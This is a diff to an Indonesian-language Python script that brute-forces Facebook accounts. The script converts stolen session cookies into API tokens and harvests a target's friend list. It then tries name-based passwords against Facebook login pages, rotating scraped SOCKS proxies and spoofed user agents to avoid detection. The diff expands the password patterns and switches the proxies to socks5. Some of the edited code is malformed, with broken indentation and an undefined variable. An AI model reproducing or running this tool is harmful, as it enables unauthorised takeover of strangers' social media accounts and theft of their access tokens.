@@ -17,89 +17,30 @@ ualu,ualuh = [],[]
 
 ###----------[ GET PROXY ]----------###
 try:
-	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('socksku.txt','w').write(proxylist)
 except Exception as e:
 	baz_anim(f'gagal ster :(')
 proxsi=open('socksku.txt','r').read().splitlines()
 
-###----------[ USER AGENT 1 ]----------###
-for agenku in range(10000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c='Redmi 4A Build/MMB29M; wv)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	e=random.randrange(80,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	usragent.append(uakuh)
+###----------[ USER AGENT ]----------###
+for useragentx in range(10101):
+ a = random.choice(['6','7','8','9','10','11','12','13'])
+ b = random.choice(['ASUS_Z01KD','ASUS_Z00VD','ASUS_Z010D','ASUS_X017D'])
+ versioncrhome = '0'
+ c = f'{str(random.randrange(83,106))}.{versioncrhome}.{str(random.randrange(4600,5249))}.{str(random.randrange(50,140))}'
+ useragentbas = f'Mozilla/5.0 (Linux; Android {a}; {b}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36'
+ usragent.append(useragentbas)
+ 
+for useragentz in range(10101):
+ a = random.choice(['6','7','8','9','10','11','12','13'])
+ b = random.choice(['Infinix X669C','Infinix X6833B','Infinix X6821','Infinix X6731'])
+ versioncrhome = '0'
+ c = f'{str(random.randrange(83,106))}.{versioncrhome}.{str(random.randrange(4600,5249))}.{str(random.randrange(50,140))}'
+ useragentbas = f'Mozilla/5.0 (Linux; Android {a}; {b}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36'
+ usrgent2.append(useragentbas)
 	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c='Redmi Note 9 Pro Build/MMB29M; wv)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	e=random.randrange(80,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	usragent.append(uakuh)
-	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c='Redmi 6A Build/MMB29M; wv)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	e=random.randrange(80,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	usragent.append(uakuh)
-	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c='Redmi Note 5A Build/MMB29M; wv)'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	e=random.randrange(80,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Mobile Safari/537.36'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	usragent.append(uakuh)
-
-###----------[ USER AGENT 2 ]----------###
-for agenkuw in range(10000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8.1.0','9','10','11','12'])
-	c='CPH2109'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Safari/537.36'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	usrgent2.append(uakuh)
-	
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8.1.0','9','10','11','12'])
-	c='CPH2089'
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	e=random.randrange(83,103)
-	f='0'
-	g=random.randrange(4200,4900)
-	h=random.randrange(40,150)
-	i='Safari/537.36'
-	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-	usrgent2.append(uakuh)
-	
-###----------[ PEWARNA ]----------###
+###----------[ WARNA PRINT ]----------###
 mer = '\033[1;31m'
 kun = '\033[1;33m'
 hijo = '\033[1;32m'
@@ -117,15 +58,19 @@ th = datetime.datetime.now().year
 okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
 cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
 
-###----------[ UNTUK ANIMASI ]----------###
+###----------[ MACHINE SUPP ]----------###
 def baz_anim(berjalan):
         for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
 def baz_bann(berjalan):
         for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
-     
-###----------[ BANNER MENUH ]----------###
+def clearlayar():
+	if "linux" in sys.platform.lower():
+		try:os.system("clear")
+		except:pass
+
+###----------[ LOGO BANNER ]----------###
 def banner():
-	os.system('clear')
+	clearlayar()
 	baz_bann(f'''{mer}   _____ __________  ______
 {mer}  / ___// ____/ __ )/ ____/
 {mer}  \__ \/ /   / __  / /_    
@@ -133,7 +78,7 @@ def banner():
 {puti}/____/\____/_____/_/
 simpel crack brute force''')
 
-###----------[ CEK COKIS TOKEN ]----------###
+###----------[ LOGIN COOKIES ]----------###
 def login_baz():
 	try:
 		token = open('.tokenakun.txt','r').read()
@@ -150,67 +95,156 @@ def login_baz():
 			exit()
 	except IOError:
 		login_men()
-		
-###----------[ BAGIAN LOGIN COKIS ]----------###
 def login_men():
 	try:
-		os.system('clear')
+		clearlayar()
 		banner()
+		ses = requests.Session()
 		print('─────────────────────────────')
-		your_cookies = input(f'└── cookies :{xxx}{hijo} ')
-		with requests.Session() as r:
-			try:
-				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
-				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
-				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
-				code, user_code = response['code'], response['user_code']
-				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
-				r.headers.pop('content-type')
-				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
-				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
-				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print("\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m └──\x1b[1;92mlogin gagal cookies invalid \33[m(\x1b[1;91m×\33[m)", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
-				else:
-					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
-					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
-					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
-					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
-					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
-					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
-					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
-						r.headers.pop('content-type');r.headers.pop('origin')
-						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
-						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
-						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
-						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
-						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
-						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
-						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
-						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
-						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
-						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
-						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
-						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
-						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
-						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
-						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
-						r.headers.pop('content-type');r.headers.pop('origin')
-						r.headers.update({'referer': 'https://m.facebook.com/',})
-						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
-						if 'Sukses!' in str(response6):
-							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
-							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
-							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							tokenew = open(".tokenakun.txt","w").write(access_token)
-							cook= open(".cookiesakun.txt","w").write(your_cookies)
-							print("\n└── \x1b[1;92mcookies valid login berhasil");exit()
-			except Exception as e:
-				print("\x1b[1;92m[×\x1b[1;92m]\033[93m └──\x1b[1;92mcookies telah kadaluarsa")
-				os.system('rm -rf .tokenakun.txt && rm -rf .cookiesakun.txt')
-				print(e)
-				time.sleep(3)
-				back()
-	except:pass
+		cok = input(f'└── cookies :{xxx}{hijo} ')
+		ses.headers.update(
+            {
+                'content-type': 'application/x-www-form-urlencoded',
+            }
+        )
+        data = {
+            'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
+            'scope': ''
+        }
+        response = json.loads(
+            ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
+        code, user_code = response['code'], response['user_code']
+        verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), (
+            'https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
+        ses.headers.pop(
+            'content-type'
+        )
+        ses.headers.update(
+            {
+                'sec-fetch-mode': 'navigate',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
+                'sec-fetch-site': 'cross-site',
+                'Host': 'm.facebook.com',
+                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                        'sec-fetch-dest': 'document',
+            }
+        )
+        response2 = ses.get(verification_url, cookies={'cookie': cok}).text
+        if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
+            exit('\n└── cookies anda tidak valid')
+        else:
+            action = re.search('action="(.*?)">', str(response2)
+                               ).group(1).replace('amp;', '')
+            fb_dtsg = re.search(
+                'name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
+            jazoest = re.search(
+                'name="jazoest" value="(\d+)"', str(response2)).group(1)
+            data = {
+                'fb_dtsg': fb_dtsg,
+                'jazoest': jazoest,
+                'qr': 0,
+                'user_code': user_code,
+            }
+            ses.headers.update(
+                {
+                    'origin': 'https://m.facebook.com',
+                    'referer': verification_url,
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'sec-fetch-site': 'same-origin',
+                }
+            )
+            response3 = ses.post(
+                'https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': cok})
+            if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
+                ses.headers.pop(
+                    'content-type'
+                )
+                ses.headers.pop(
+                    'origin'
+                )
+                response4 = ses.post(response3.url, data=data, cookies={
+                                     'cookie': cok}).text
+                action = re.search(
+                    'action="(.*?)"', str(response4)).group(1).replace('amp;', '')
+                fb_dtsg = re.search(
+                    'name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
+                jazoest = re.search(
+                    'name="jazoest" value="(\d+)"', str(response4)).group(1)
+                scope = re.search('name="scope" value="(.*?)"',
+                                  str(response4)).group(1)
+                display = re.search(
+                    'name="display" value="(.*?)"', str(response4)).group(1)
+                user_code = re.search(
+                    'name="user_code" value="(.*?)"', str(response4)).group(1)
+                logger_id = re.search(
+                    'name="logger_id" value="(.*?)"', str(response4)).group(1)
+                auth_type = re.search(
+                    'name="auth_type" value="(.*?)"', str(response4)).group(1)
+                encrypted_post_body = re.search(
+                    'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
+                return_format = re.search(
+                    'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
+                ses.headers.update(
+                    {
+                        'origin': 'https://m.facebook.com',
+                        'referer': response3.url,
+                        'content-type': 'application/x-www-form-urlencoded',
+                    }
+                )
+                data = {
+                    'fb_dtsg': fb_dtsg,
+                    'jazoest': jazoest,
+                    'scope': scope,
+                    'display': display,
+                    'user_code': user_code,
+                    'logger_id': logger_id,
+                    'auth_type': auth_type,
+                    'encrypted_post_body': encrypted_post_body,
+                    'return_format[]': return_format,
+                }
+                response5 = ses.post(
+                    'https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': cok}).text
+                windows_referer = re.search(
+                    'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
+                ses.headers.pop(
+                    'content-type'
+                )
+                ses.headers.pop(
+                    'origin'
+                )
+                ses.headers.update(
+                    {
+                        'referer': 'https://m.facebook.com/',
+                    }
+                )
+                response6 = ses.get(windows_referer, cookies={
+                                    'cookie': cok}).text
+                if 'Sukses!' in str(response6):
+                    ses.headers.update(
+                        {
+                            'sec-fetch-mode': 'no-cors',
+                            'referer': 'https://graph.facebook.com/',
+                            'Host': 'graph.facebook.com',
+                                    'accept': '*/*',
+                                    'sec-fetch-dest': 'script',
+                                    'sec-fetch-site': 'cross-site',
+                        }
+                    )
+                    response7 = ses.get(status_url, cookies={
+                                        'cookie': cok}).text
+                    tok = re.search('"access_token": "(.*?)"',
+                                    str(response7)).group(1)
+                    token = open(".tokeneakun.txt", "w").write(token)
+                    cok = open(".cookiesakun.txt", "w").write(cok)
+                    baz_anim(f'└──{hijo} selamat cookies anda valid')
+                else:
+                    exit(f'\n└──{mer} login gagal cookies invalid')
+
+    except Exception as e:
+        print(f'\n└──{mer} login gagal cookies invalid')
+        os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
+        print(e)
+        exit()
 
 ###----------[ BAGIAN MENU ]----------###
 def menu(id):
@@ -222,8 +256,6 @@ def menu(id):
 		waktu(1)
 		login_men()
 	os.system('clear')
-	os.system('xdg-open https://chat.whatsapp.com/Bk9n3OYSK0h8yc4oHgHkZN')
-	waktu(1)
 	banner()
 	print(f'{xxx}─────────────────────────────')
 	print(f'{xxx}└── crack publik atau file')
@@ -240,24 +272,54 @@ def menu(id):
 def nge_krek():
 	try:
 		cok = open('.cookiesakun.txt','r').read()
+		token = open(".tokeneakun.txt", "w").write(token)
 	except IOError:
 		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
 		baz_anim(f'└──{mer} cookies telah kadaluarsa ster')
 		exit()
 	print(f'{xxx}─────────────────────────────')
-	idnyanih = input(f'└── id : ')
+	user = input(f'└── id : ')
 	try:
-		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
-		for proses in ambilid['friends']['data']:
-			try:id.append(proses['id']+'|'+proses['name'])
-			except:continue
-		print(f'└── terkumpul : '+str(len(id)))
+            head = (
+                {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+                 })
+            if len(id) == 0:
+                params = (
+                    {
+                        'access_token': token,
+                        'fields': "friends"
+                    }
+                )
+            else:
+                params = (
+                    {
+                        'access_token': token,
+                        'fields': "friends"
+                    }
+                )
+            url = requests.get('https://graph.facebook.com/{}'.format(user),
+                               params=params, headers=head, cookies={'cookies': cok}).json()
+            for ambil in url['friends']['data']:
+                try:
+                    cek = (ambil['id']+'|'+ambil['name'])
+                    if cek in id:
+                        pass
+                    else:
+                        id.append(cek)
+                except:
+                    continue
+        except (KeyError, IOError):
+            pass
+        except requests.exceptions.ConnectionError:
+            exit()
+    try:
+        print(f'└── terkumpul : '+str(len(id)))
 		atur_dulu()
-	except requests.exceptions.ConnectionError:
-		baz_anim(f'{puti}└──{mer} koneksi terputus')
+    except requests.exceptions.ConnectionError:
+        baz_anim(f'{puti}└──{mer} koneksi terputus')
 		exit()
-	except (KeyError,IOError):
-		baz_anim(f'{puti}└──{mer} teman tidak publik')
+    except (KeyError, IOError):
+        baz_anim(f'{puti}└──{mer} teman tidak publik')
 		baz_anim(f'{puti}└──{mer} ganti id target nya')
 		waktu(1)
 		nge_krek()
@@ -356,6 +418,12 @@ def passwrdh():
 					if len(frs)<3:
 						pass
 					else:
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
 						pwv.append(frs+'321')
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
@@ -366,6 +434,12 @@ def passwrdh():
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
 						pwv.append(frs+'321')
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
@@ -395,7 +469,7 @@ def metodh1(idf,pwv):
 	for pw in pwv:
 		try:
 			nip=random.choice(proxsi)
-			proxs= {'http': 'socks4://'+nip}
+			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
 			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
@@ -464,7 +538,7 @@ def atur_dulu():
 		for akunlama in sorted(id):
 			id2.append(akunlama)
 	else:
-		baz_anim(f'{puti}└──{mer} pilih yang bener{xxx}')
+		baz_anim(f'{puti}└──{mer} pilih yang bener ster{xxx}')
 		waktu(1)
 		atur_dulu()
 		exit()
@@ -495,7 +569,7 @@ def atur_dulu():
 		ualuh.append('tidak')
 	passwrd()
 
-###----------[ BAGIAN PASSWORD ]----------###
+###----------[ BAGIAN WORDLIST ]----------###
 def passwrd():
 	global prog,des
 	print(f'{xxx}─────────────────────────────')
@@ -512,6 +586,12 @@ def passwrd():
 					if len(frs)<3:
 						pass
 					else:
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
 						pwv.append(frs+'321')
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
@@ -522,6 +602,12 @@ def passwrd():
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
+						pwv.append(frs+'01')
+						pwv.append(frs+'02')
+						pwv.append(frs+'03')
+						pwv.append(frs+'04')
+						pwv.append(frs+'05')
+						pwv.append(frs+'06')
 						pwv.append(frs+'321')
 						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
@@ -555,7 +641,7 @@ def metod1(idf,pwv):
 		try:
 			if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(proxsi)
-			proxs= {'http': 'socks4://'+nip}
+			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
 			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
